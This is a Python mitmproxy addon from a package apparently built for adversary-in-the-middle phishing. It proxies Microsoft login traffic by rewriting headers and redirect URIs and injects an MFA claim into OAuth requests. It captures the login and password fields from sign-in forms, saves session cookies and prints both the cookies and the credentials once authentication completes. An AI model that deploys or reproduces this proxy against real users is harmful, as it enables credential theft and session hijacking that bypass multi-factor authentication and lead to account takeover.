"""
Modifier Addon for mitmproxy.
"""

from __future__ import annotations

import json
import logging
from http.cookies import SimpleCookie

from mitmproxy.http import HTTPFlow

from aitm.aitm_config import config
from aitm.helpers import cookies, requests, responses

logger = logging.getLogger(__name__)


class ModifierAddon:
    """
    Addon Class for mitmproxy.

    This addon modifies HTTP requests and responses passing through mitmproxy.
    """

    credentials: dict[str, str] = {}
    simple_cookie: SimpleCookie = SimpleCookie()

    def request(self, flow: HTTPFlow) -> None:
        """
        Modifies HTTP request headers and query parameters.

        This method is called by mitmproxy for each HTTP request. It modifies
        specific headers and query parameters as defined in the helper functions.
        Additionally, it extracts and stores credentials from login requests.

        Args:
            flow (mitmproxy.http.HTTPFlow): The HTTP flow object representing
                                            the client request and server response.
        """
        requests.modify_header(flow, "Host")
        requests.modify_header(flow, "Referer")
        requests.modify_header(flow, "Origin")
        requests.modify_header(flow, "Location")
        requests.modify_query(flow, "redirect_uri")

        if flow.request.path.startswith("/common/oauth2/v2.0/authorize"):
            flow.request.query["claims"] = config.mfa_claim
        if flow.request.path.startswith("/common/login"):
            self.credentials["login"] = flow.request.urlencoded_form["login"]
            self.credentials["passwd"] = flow.request.urlencoded_form["passwd"]

    def response(self, flow: HTTPFlow) -> None:
        """
        Modifies HTTP response headers, cookies, and content.

        This method is called by mitmproxy for each HTTP response. It modifies
        specific headers, saves and modifies cookies, and potentially alters the
        response content as defined in the helper functions. It also prints
        parsed cookies and stored credentials for authentication URLs.

        Args:
            flow (mitmproxy.http.HTTPFlow): The HTTP flow object representing
                                            the client request and server response.
        """
        responses.modify_header(flow, "Location")
        responses.save_cookies(flow, self.simple_cookie)
        responses.modify_cookies(flow)
        responses.modify_content(flow)

        if flow.request.path in config.auth_url:
            print(json.dumps(cookies.parse_cookies(self.simple_cookie)))
            print(self.credentials)
